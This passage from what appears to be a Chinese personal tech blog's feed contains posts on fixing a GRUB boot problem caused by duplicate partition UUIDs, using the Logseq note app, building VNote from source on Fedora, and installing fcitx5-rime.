class="hljs-attribute">GRUB_DISABLE_SUBMENU</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">GRUB_TERMINAL_OUTPUT</span>=<span class="hljs-string">&quot;console&quot;</span><br><span class="hljs-attribute">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1 rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet&quot;</span><br><span class="hljs-attribute">GRUB_DISABLE_RECOVERY</span>=<span class="hljs-string">&quot;true&quot;</span><br></code></pre></td></tr></table></figure><p>grub2-mkconfig 里查找根用这句</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">GRUB_DEVICE</span>=<span class="hljs-string">&quot;`$&#123;grub_probe&#125; --target=device /`&quot;</span>  <br></code></pre></td></tr></table></figure><p>执行查看结果， 发现正确</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ grub2-probe --target=device /<br><br>/dev/sdb1<br></code></pre></td></tr></table></figure><p>可是为什么不能正确启动呢，看看生成的 grub.cfg 文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">linux16</span> /vmlinuz-<span class="hljs-number">4</span>.<span class="hljs-number">17</span>.<span class="hljs-number">2</span>-<span class="hljs-number">200</span>.fc28.x86_64 root=UUID=<span class="hljs-number">290</span>a98e3-<span class="hljs-number">7937</span>-<span class="hljs-number">49</span>db-a971-<span class="hljs-number">4</span>d0e49567cf0<br></code></pre></td></tr></table></figure><p>使用的是 UUID，并不是 &#x2F;dev, 执行 <code>sudo blkid</code> 查看一下各分区的 uuid</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># blkid</span><br><br>/dev/sdb1: UUID=<span class="hljs-string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span> PARTUUID=<span class="hljs-string">&quot;fe64f395-7520-42c3-939b-b17eb7064cec&quot;</span><br>/dev/mapper/fedora-root: UUID=<span class="hljs-string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span><br></code></pre></td></tr></table></figure><p>由于dd 的原因，&#x2F;dev&#x2F;sdb1 和 &#x2F;dev&#x2F;mapper&#x2F;fedora-root 的 UUID 居然是相同的。首先想到的是把&#x2F;dev&#x2F;sdb1 的 UUID 给改了。放狗搜发现有下面的方法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ uuidgen <br>8e4c27b2-c63e-4d1d-8ac4-5ddd90669eb0<br><br>tune2fs /dev/&#123;device&#125; -U &#123;uuid&#125;<br></code></pre></td></tr></table></figure><p>可是tune2fs 时报错，死活改不过来。</p><p>lzx 提示可以看看如何是grub.cfg 不使用uuid， 发现有个参数 <code>GRUB_DISABLE_UUID=true</code>， 在 &#x2F;etc&#x2F;default&#x2F;grub 加上这行，重新生成 grub.cfg 。<br><code>$ grub2-mkconfig -o /boot/grub2/grub.cfg</code></p><p>重启，成功进入到SSD 的新 root 。</p><p>有的系统上的参数可能不太一样，ubuntu 系统里这个参数好像的是 <code>GRUB_DISABLE_LINUX_UUID=true</code> 需要确认一下。</p><ul><li>EOF</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Logseq 使用小结 （二）</title>
    <link href="/cn/logseq2/"/>
    <url>/cn/logseq2/</url>
    
    <content type="html"><![CDATA[<p>用了 Logseq 一段时间了，做个简单的总结，国内的很多文章，在我看来还是不够简单明了, 本文大致介绍了 Logseq 比较常用的一些功能的使用。</p><h2 id="Flashcards"><a href="#Flashcards" class="headerlink" title="Flashcards"></a>Flashcards</h2><p>可以把记录的知识点当作卡片来记忆，用过 Anki 的同学，应该都比较熟悉了，使用的记忆算法为 <a href="https://www.supermemo.com/en/archives1990-2015/english/ol/sm5">SM-5</a><br>要将一个 block 记为卡片非常简单，使用 <code>#card</code> 标签就可以了。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq5.png"></p><h3 id="卡片组"><a href="#卡片组" class="headerlink" title="卡片组"></a>卡片组</h3><p>有些卡片可能是归属同一个大类，这时候就可以使用卡片组了。像我上面这个例子中，要记忆的单词都在 <code>英语单词积累</code>下，就可以使用语法 <code>&#123;&#123;cards 英语单词积累&#125;&#125;</code> 效果如下图，<br>可以看出我已经积累了7张卡片了。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq6.png"></p><p>要背诵需要记忆的卡片时，单击左侧的 Flashcards 就可以了，使用方面没有什么特别的地方，有三个选项可以选择。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq7.png"></p><h2 id="theme-（皮肤）"><a href="#theme-（皮肤）" class="headerlink" title="theme （皮肤）"></a>theme （皮肤）</h2><p>皮肤就是青菜萝卜各有所爱了，推荐两款我自己比较喜欢的的皮肤。</p><p><img src="https://github.com/pengx17/logseq-laurel-theme/raw/master/white.png"><br><img src="https://raw.githubusercontent.com/tobealive/logseq-allday-theme/main/preview.png"></p><p>Github 仓库地址如下：</p><p><a href="https://github.com/pengx17/logseq-laurel-theme">https://github.com/pengx17/logseq-laurel-theme</a><br><a href="https://github.com/tobealive/logseq-allday-theme">https://github.com/tobealive/logseq-allday-theme</a></p><p>有两种方法可以设置皮肤：</p><ul><li>custom.css</li><li>plugin system</li></ul><p>使用 custom.css，打开 Settings -&gt;     General -&gt;  Custom theme  点击 <code>custom.css</code> 复制 css 内容，保存退出即可。<br>使用插件系统，则需要先把插件系统打开，Settings  -&gt;  Advanced -&gt; Plug-in system 。打开插件系统后，可以直接使用<br>Plugins -&gt; Marketplace -&gt; themes 选择你喜欢的 theme 点击 <code>Install</code> 就可以了</p><p>不过还是推荐使用 Logseq 自带的插件管理系统来安装，可以自动升级比较方便，切换皮肤可以点击右上角 三个点 -&gt; Themes 选择皮肤。 </p><h2 id="plugin-（插件）"><a href="#plugin-（插件）" class="headerlink" title="plugin （插件）"></a>plugin （插件）</h2><p>使用 Logseq 插件同样是两种方法：</p><ul><li>plugin system</li><li>Load unpacked plugin</li></ul><p>使用插件系统的方法和上面安装皮肤的步骤大致相同，依次点击 Plugins -&gt; Marketplace -&gt; Plugins ，选择插件点击 <code>Install</code> 即可。要加载 <code>unpacked plugin</code> 首先要打开开发者模式 Settings  -&gt;  Advanced -&gt; Developer mode ,  设置为打开。打开后使用插件管理系统 Plugins -&gt; Installed -&gt; Load unpacked plugin 选择相关目录就可以了。</p><p>具体的插件可以参考 <a href="https://github.com/logseq/awesome-logseq#Plugins">https://github.com/logseq/awesome-logseq#Plugins</a> 记录的插件都挺不错的。</p><p>值得一提的是，插件系统的网络不太稳定（总所周知的原因），使用代理会方便一些。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">https_proxy=127.0.0.1:3128 ./Logseq --proxy-server=http://127.0.0.1:3128<br></code></pre></td></tr></table></figure><p>安装插件可能会出现 timeout 错误，多重试几次就应该可以安装上了。</p><h2 id="query"><a href="#query" class="headerlink" title="query"></a>query</h2><p>query 算是 Logseq 的高级功能了，我用的也不多，输入 <code>/query</code> 回车就可以自动进入 query 了，具体的语法很灵活可以参考：<br><a href="https://logseq.github.io/#/page/queries">https://logseq.github.io/#/page/queries</a></p><p>油管上有相关 video，大家可以参考一下：<br><a href="https://www.youtube.com/watch?v=GDauxjx_bdA&ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind</a><br><a href="https://www.youtube.com/watch?v=qQ8DzumRZkM&ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind</a></p><h2 id="写在后面的话"><a href="#写在后面的话" class="headerlink" title="写在后面的话"></a>写在后面的话</h2><p>Logseq 的功能还是挺多的，两篇文章也不可能全部介绍完，官方文档总是最好的资料：<a href="https://logseq.github.io/#/page/Contents">https://logseq.github.io/#/page/Contents</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://logseq.github.io/">https://logseq.github.io</a></p><p><a href="https://www.usmacd.com/cn/logseq/">https://www.usmacd.com/cn/logseq/</a><br><a href="https://www.usmacd.com/cn/logseq3/">https://www.usmacd.com/cn/logseq3/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>logseq 试用报告</title>
    <link href="/cn/logseq/"/>
    <url>/cn/logseq/</url>
    
    <content type="html"><![CDATA[<p>最近双链笔记的概念比较火热， Roam Research 大概是第一个实现此功能的软件，后续 Notion、Obsidian、logseq 等软件大步跟进，这些软件各有千秋。下面这段是参考资料文章中的一小段，很有参考意义：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Roam</span> 的突破在于，理论上，把软件设计理念与卡片盒笔记法紧紧捆绑：<br>卢曼（Niklas Luhmann）得益于卡片盒笔记法，从公务员成为德国当代重要的社会学家，<br>因此基于卡片盒笔记法的 Roam 也可以助力你的成功；<br>技术上，推出双向链接、可视化笔记间的联系、嵌入（Transclusion）等功能，<br>让生产、查找笔记更加高效，于此同时，还省却维护层级结构的麻烦。<br></code></pre></td></tr></table></figure><p><img src="https://github.com/henices/pictures/raw/master/logseq0.jpg"><br><img src="https://github.com/henices/pictures/raw/master/logseq1.png"></p><p>上面两张图片就是<strong>卡片盒笔记法</strong> 最形象的表示了，个人觉得这种方法很适合自己。</p><p>为了体验双链笔记，我花费了不少时间，上面的几个软件都体验了一下，Roam 是收费软件，银子不够所以不选，Notion 笔记存储在云端，不符合我数据安全的要求也不选，剩下的就只有两个选项了 Obsidian 和 logseq 。</p><h2 id="Obsidian"><a href="#Obsidian" class="headerlink" title="Obsidian"></a>Obsidian</h2><p>软件主页：<a href="https://obsidian.md/">https://obsidian.md/</a><br><img src="https://github.com/henices/pictures/raw/master/logseq2.png"></p><p>挺多人选择用 Obsidian 的原因是它的 MarkDown 语法支持得比较好，MarkDown 语法有很多的使用者，类似 Typora 的 MarkDown 笔记软件是当前笔记软件的主流，这使得这些笔记软件的使用者过渡到 obsidian 会比较平滑。我是开源MarkDown 笔记软件 Vnote 的重度使用者，一度想使用 Obsidian 作为主力软件。</p><p>Obsidian 有挺多优点，比如它对个人用户永久免费，但是它不开源，而且 <a href="https://help.obsidian.md/How+to/Link+to+blocks">Link+to+blocks</a> 的语法比较别扭。最终还是没有选择它，有人说Obsidian 插件非常丰富，我自己没有折腾过。</p><h2 id="logseq"><a href="#logseq" class="headerlink" title="logseq"></a>logseq</h2><p>软件主页：<a href="https://logseq.com/">https://logseq.com/</a><br>源码仓库：<a href="https://github.com/logseq/logseq">https://github.com/logseq/logseq</a></p><p><img src="https://github.com/henices/pictures/raw/master/logseq3.png"></p><p>说了这么久终于到正主了，第一次知道双链笔记这个概念是因为有个网友在网上说使用效果不错，过渡很平滑。可能有先入为主的关系，另外我本人对开源软件一向有莫名的好感，所以主观意识上就很喜欢这个软件。logseq 的粒度足够，block reference 使用非常方便，另外 logseq 的 PDF 标记功能对于需要大量阅读论文的我来说非常好用。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq4.png"></p><p>但是 logseq 也不是没有缺点，logseq 对 markdown 语法的支持不是很好，即使直接导入 MarkDown 文件，最后显示的结果感觉也是有问题，各类标题直接转化成 block 了，这是有问题的。但是从这个角度说 logseq 就是一个纯粹的双链笔记软件而不是一个添加了双链功能的 MarkDown 笔记软件。</p><h2 id="最终的笔记管理方法"><a href="#最终的笔记管理方法" class="headerlink" title="最终的笔记管理方法"></a>最终的笔记管理方法</h2><p>说到这，问题就简化了，平时的文档记录仍然使用 MarkDown 笔记软件，只是在平时记录的时候使用双链笔记软件。这样的笔记管理方法看上去比较麻烦，其实却很完美，想写文章的时候直接用 VNote，平时知识积累记录的时候就用 logseq，根本就不用过渡，只需要启用一个新软件即可。</p><p>基于 block 的双链笔记最大的好处就是没有输出负担，一些很随意的想法都可以记录下来，因为大家确实不可能每次都有大段的想法可以输出。有人说用 logseq一年写了 30万字，我开始觉得有点夸张，但是使用一个多月发现可能属实，现在我自己都写了几万字了。每个想法 (block) 之间可能会有联系，不断记录想法，不断联系，慢慢的真能发现一些意想不到的东西之间居然有联系，而这些联系很有可能是一些关键的底层逻辑。平时在记录的时候手工划分目录，层次关系，其实已经将一些想法，概念给逻辑化了，这样的记录方法很难摆脱固有的认知，而基于 block 的双链笔记就自由的多，不断记录，不断整理，汇总就交给软件来完成吧。</p><p>我现在已经通过 logseq 的记录想清楚了一些问题，在平时的工作记录中也不断地稳步螺旋推进，在此向大家推荐这款笔记软件。</p><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>其实工具并不是那么重要，最重要的还是平时要记录，要定期输出。IT 界有一个著名的段子，你以为你是在写 blog 其实你只是在折腾 wordpress ：）</p><p>共勉。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://sspai.com/post/69503">双链笔记软件推荐：Logseq 和它的五种用法</a><br><a href="https://sspai.com/post/65273">请不要神化双链笔记</a></p><p><a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a><br><a href="https://www.usmacd.com/cn/logseq3/">https://www.usmacd.com/cn/logseq3/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown 笔记软件： VNote</title>
    <link href="/cn/vnote/"/>
    <url>/cn/vnote/</url>
    
    <content type="html"><![CDATA[<h2 id="VNote-简介"><a href="#VNote-简介" class="headerlink" title="VNote 简介"></a>VNote 简介</h2><p>向大家安利一款 markdown 笔记软件， VNote <a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a><br>此软件目前已经 1300 多个commits 了，做为一个有些开源软件维护经历的人，深感不易。用了太多 markdown 笔记软件，此软件使得最为顺手，尤其作为程序员 vim 模式 让我感到非常舒服，大量图表的支持比如 UML 流程图，让我用起来很顺手。</p><p>Vnote 分为两个开发阶段，阶段一 vnote2 已经开发完成：<a href="https://github.com/vnotex/vnote/tree/vnote2">https://github.com/vnotex/vnote/tree/vnote2</a><br>现在处于第二个开发阶段：<a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p><p>据说后续会出收费版本，但目前看还需要很长的一段时间了。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/vnote.png" alt="VNote"></p><p>我前后尝试过各种笔记软件，我理想的软件有几点：</p><ul><li>a. 支持文件管理</li><li>b. 不要乱改数据，容易迁移</li><li>c. 支持 markdown</li><li>d. 跨平台，支持 Mac 和 Linux</li></ul><p>最后，终于发现了 VNote，有点惊喜。</p><h2 id="Fedora-上使用-Qt5-编译-VNote"><a href="#Fedora-上使用-Qt5-编译-VNote" class="headerlink" title="Fedora 上使用 Qt5 编译 VNote"></a>Fedora 上使用 Qt5 编译 VNote</h2><p>在 Linux 下编译 VNote 显示有明显改进，下面是编译的方法：</p><ol><li>下载 QT SDK  （最新的 vnotex 官方支持 Qt 5.15.2，可自行下载使用替换相应的版本即可）</li></ol><p><a href="https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run">https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run</a></p><p>将 Qt5.9 安装到 &#x2F;home&#x2F;henices&#x2F;Qt5.9.0&#x2F;</p><ol start="2"><li>编译 fcitx-qt5 （如果使用的是 fcitx5，需要下载编译 fcitx5-qt）</li></ol><p>git clone <a href="https://gitlab.com/fcitx/fcitx-qt5.git">https://gitlab.com/fcitx/fcitx-qt5.git</a></p><p>准备编译脚本 <code>build_linux.sh</code>， 指定下载的QT</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">QTDIR=<span class="hljs-string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span><br>PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$QTDIR</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>LDFLAGS=-L<span class="hljs-variable">$QTDIR</span>/lib<br>CPPFLAGS=-I<span class="hljs-variable">$QTDIR</span>/include<br><br><span class="hljs-built_in">rm</span> -rf build<br><span class="hljs-built_in">mkdir</span> -p build<br><span class="hljs-built_in">cd</span> build<br>cmake ..<br>make -j8<br></code></pre></td></tr></table></figure><p>使用下面命令编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">chmod</span> a+x ./build_linux.sh<br>./build_linux.sh<br></code></pre></td></tr></table></figure><p>将生成的 libfcitxplatforminputcontextplugin.so copy 到<br><code>/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/</code></p><ol start="3"><li>获取VNote 源码</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/tamlok/vnote.git vnote.git<br><span class="hljs-built_in">cd</span> vnote.git<br>git submodule update --init<br></code></pre></td></tr></table></figure><ol start="4"><li>编译</li></ol><p>build_linux.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">QTDIR=<span class="hljs-string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span><br>PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$QTDIR</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>LDFLAGS=-L<span class="hljs-variable">$QTDIR</span>/lib<br>CPPFLAGS=-I<span class="hljs-variable">$QTDIR</span>/include<br><br><span class="hljs-built_in">rm</span> -rf build<br><span class="hljs-built_in">mkdir</span> -p build<br><span class="hljs-built_in">cd</span> build<br>qmake -v<br>qmake PREFIX=/usr/local CONFIG-=debug CONFIG+=release ../VNote.pro<br>make -j8<br></code></pre></td></tr></table></figure><p>使用下面命令编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> a+x ./build_linux.sh<br>./build_linux.sh<br></code></pre></td></tr></table></figure><ol start="5"><li>安装</li></ol><p><code>sudo make install</code></p><h3 id="Qt-5-12-11-的诡异问题"><a href="#Qt-5-12-11-的诡异问题" class="headerlink" title="Qt 5.12.11 的诡异问题"></a>Qt 5.12.11 的诡异问题</h3><p>Fedora 升级到 35 后，Vnote 出现了一系列问题</p><ol><li>vnote 的阅读模式不能正常显示 （Qt 5.12.11），解决这个问题需要禁用 Qtwebengine 的 sandbox</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./vnote --no-sandbox<br></code></pre></td></tr></table></figure><ol start="2"><li>导出 pdf 文件 cpu 100%  （Fedora 系统自带 Qt 5.15.2 编译）</li><li>官方提供的 Linux AppImage 文件无法打开 Fcitx5 输入法。</li></ol><p>最终解决问题的方法是下载 Qt5.15.2 重新编译 Vnote， Qt 从 5.15 开始不提供离线安装包，非常不方便。<br>官方提供的在线升级包如果太新只能安装 Qt 6，所以必须下载老版本的 online installer<br><a href="https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run">https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run</a></p><p>具体内容可以参考 <a href="https://github.com/vnotex/vnote/issues/1942">https://github.com/vnotex/vnote/issues/1942</a> 的讨论</p><p>2022.8.2 更新</p><p>导出 pdf 文件 cpu 100% 的问题，我调试 Qt 5.15.5 代码时已经解决，可以参考：<br><a href="https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b">https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b</a></p><h3 id="Qt-5-15-3-的诡异问题"><a href="#Qt-5-15-3-的诡异问题" class="headerlink" title="Qt 5.15.3 的诡异问题"></a>Qt 5.15.3 的诡异问题</h3><p>使用 Qt 5.15.3 编译 VNOte 后，出现下面的报错</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[<span class="hljs-number">695784</span><span class="hljs-symbol">:</span><span class="hljs-number">695784</span><span class="hljs-symbol">:</span><span class="hljs-number">0401</span>/<span class="hljs-number">181224.580254</span><span class="hljs-symbol">:ERROR</span><span class="hljs-symbol">:network_service_instance_impl</span>.cc(<span class="hljs-number">286</span>)] <span class="hljs-title class_">Network</span> service crashed, restarting service.<br></code></pre></td></tr></table></figure><p>bug 在这 <a href="https://bugreports.qt.io/browse/QTBUG-91715">https://bugreports.qt.io/browse/QTBUG-91715</a> 可以先使用环境变量救急一下</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">QTWEBENGINE_DISABLE_SANDBOX=1 QTWEBENGINE_CHROMIUM_FLAGS=<span class="hljs-params">--lang=de</span> <span class="hljs-string">./vnote</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--disable-gpu</span><br></code></pre></td></tr></table></figure><p>2022.8.2 更新: Qt 5.15.5 已经修复了这个问题。</p><h2 id="Fedora-上使用-Qt6-编译-VNote"><a href="#Fedora-上使用-Qt6-编译-VNote" class="headerlink" title="Fedora 上使用 Qt6 编译 VNote"></a>Fedora 上使用 Qt6 编译 VNote</h2><p>最近，VNote 迎来了一个大更新，支持Qt6 并保留了对 Qt5 的支持。使用Qt6 编译 VNote 需要安装一些依赖库，下面的可能不全，需要根据具体情况调整。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo dnf install qt6-qtbase-devel qt6-qt5compat-devel qt6-qtsvg-devel qt6-qtwebengine-devel<br></code></pre></td></tr></table></figure><p>使用 Fedora 系统自带的 Qt6 编译比较简单，在 VNote 的源码目录新建一个脚本 build.sh，内容如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">VNOTEDIR=~/vnote/<br><span class="hljs-built_in">mkdir</span> -p build_system<br><span class="hljs-built_in">cd</span> build_system<br>/lib64/qt6/bin/qmake PREFIX=<span class="hljs-variable">$&#123;VNOTEDIR&#125;</span> CONFIG+=release -spec linux-g++-64 ../vnote.pro<br>make -j`<span class="hljs-built_in">nproc</span>` &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>VNOTEDIR 为安装目录需要自己定义，然后执行命令 <code>chmod a+x .build.sh &amp;&amp; bash ./build.sh</code> 即可完成编译和安装。</p><h3 id="Fedora-上使用-Qt6-编译-VNote-的新方法-（2024-6-14）"><a href="#Fedora-上使用-Qt6-编译-VNote-的新方法-（2024-6-14）" class="headerlink" title="Fedora 上使用 Qt6 编译 VNote 的新方法 （2024.6.14）"></a>Fedora 上使用 Qt6 编译 VNote 的新方法 （2024.6.14）</h3><p>一个好消息，VNote 的作者还在努力更新中。</p><p>tamlok 重写了 vnote 的构建代码，较大的变化是项目文件下的 vnote.pro 被删除了，Linux 下也使用 cmake 进行编译，参考 <a href="https://github.com/vnotex/vnote/blob/master/.github/workflows/ci-linux.yml">ci-linux</a> 的代码：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Configure</span> <span class="hljs-string">Project</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    qmake -v</span><br><span class="hljs-string">    cmake --version</span><br><span class="hljs-string">    cmake $&#123;GITHUB_WORKSPACE&#125;</span><br><span class="hljs-string"></span>  <span class="hljs-attr">working-directory:</span> <span class="hljs-string">$&#123;&#123;runner.workspace&#125;&#125;/build</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">Project</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    cmake --build . --target pack</span><br><span class="hljs-string"></span>  <span class="hljs-attr">working-directory:</span> <span class="hljs-string">$&#123;&#123;runner.workspace&#125;&#125;/build</span><br></code></pre></td></tr></table></figure><p>重新写一个 <code>build.sh</code> , 进行自动化的 vnote 编译，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">VNOTEDIR=~/vnote/<br><span class="hljs-built_in">mkdir</span> -p build_system<br><span class="hljs-built_in">cd</span> build_system<br><span class="hljs-comment">#/lib64/qt6/bin/qmake PREFIX=$&#123;VNOTEDIR&#125; CONFIG+=release -spec linux-g++-64 ../vnote.pro</span><br>cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=<span class="hljs-variable">$&#123;VNOTEDIR&#125;</span> ..<br>make -j`<span class="hljs-built_in">nproc</span>` &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>然后执行命令 <code>chmod a+x .build.sh &amp;&amp; bash ./build.sh</code> 即可完成编译和安装。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md">https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md</a></p><p><a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fedora KDE Plasma 上安装 fcitx5 rime</title>
    <link href="/cn/fcitx5-rime/"/>
    <url>/cn/fcitx5-rime/</url>
    
    <content type="html"><![CDATA[<p>现在 fcitx 已经升级到了 fcitx5, 本来用着 fcitx4 挺好，也没有想着升级，在折腾 fcitx.vim 的时候发现 fcitx 居然升级了，使得我的 vim 插件无法正常工作了，一顿折腾，本来以为很简单没想到进了个大坑 。<br>主要是不愿意放弃我的一万多行的 rime 用户词库，多年的积累了，不过 Linux 用户不就是老折腾吗， 唉。</p><p>fcitx5-rime 的默认的配置目录已经变为 <code>~/.local/share/fcitx5/rime</code>， fcitx4 默认的配置目录是 <code>~/.config/fcitx/rime</code></p><h2 id="安装-fcitx5-和-fcitx5-rime"><a href="#安装-fcitx5-和-fcitx5-rime" class="headerlink" title="安装 fcitx5 和 fcitx5 rime"></a>安装 fcitx5 和 fcitx5 rime</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf install -y fcitx5 fcitx5-autostart fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt kcm-fcitx5<br>sudo dnf install -y fcitx5-rime<br></code></pre></td></tr></table></figure><p>Fedora dnf 已经默认有 fcitx5-rime 的安装包了，不用自己重新编译了，非常不错。 <code>fcitx5-chinese-addons </code> 为 fcitx5 自己默认带的中文输入法，这些和 rime 没有什么关系，网络上有人说， fcitx 的中文输入较以前有较大改进。<code>fcitx5-autostart</code> 用于自启动，不安装其实也没有什么问题。</p><p>Fcitx5 官方说明需要设置启动文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mkdir</span> -p ~/.config/autostart &amp;&amp; 